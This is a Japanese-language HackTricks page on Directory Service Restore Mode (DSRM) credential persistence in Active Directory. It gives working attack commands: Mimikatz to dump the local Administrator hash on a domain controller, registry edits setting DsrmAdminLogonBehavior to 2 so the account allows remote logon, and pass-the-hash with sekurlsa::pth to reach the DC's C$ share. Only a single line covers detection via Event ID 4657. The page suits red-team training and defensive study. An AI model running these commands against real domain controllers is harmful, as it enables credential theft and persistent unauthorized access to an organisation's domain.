# DSRM 認証情報

{{#include ../../banners/hacktricks-training.md}}

## 基本情報

各 **DC** 内には **ローカル管理者** アカウントが存在します。このマシンで管理者権限を取得すると、mimikatz を使用して **ローカル Administrator の hash** を **dump** できます。その後、レジストリを変更して **この password を有効化** することで、このローカル Administrator user にリモートアクセスできるようになります。\
まず、DC 内の **ローカル Administrator** user の **hash** を **dump** する必要があります：
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
次に、そのアカウントが使用できるか確認します。レジストリキーの値が「0」であるか、存在しない場合は、**「2」に設定する**必要があります。
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
その後、PTHを使用して**C$の内容を一覧表示したり、shellを取得したりできます**。なお、そのhashをメモリ内で使用してPTH用の新しいpowershellセッションを作成する場合、使用する「domain」はDCマシンの名前だけです:
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
詳細については、[https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) および [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)<sup>[[1]](#references)[[2]](#references)</sup> を参照してください。

## 対策

- Event ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior` の作成・変更を監査する

## 参考資料

- [1] [Sneaky Active Directory Persistence #11: Directory Service Restore Mode (DSRM)](https://adsecurity.org/?p=1714)
- [2] [Sneaky Active Directory Persistence #13: DSRM Persistence v2](https://adsecurity.org/?p=1785)

{{#include ../../banners/hacktricks-training.md}}
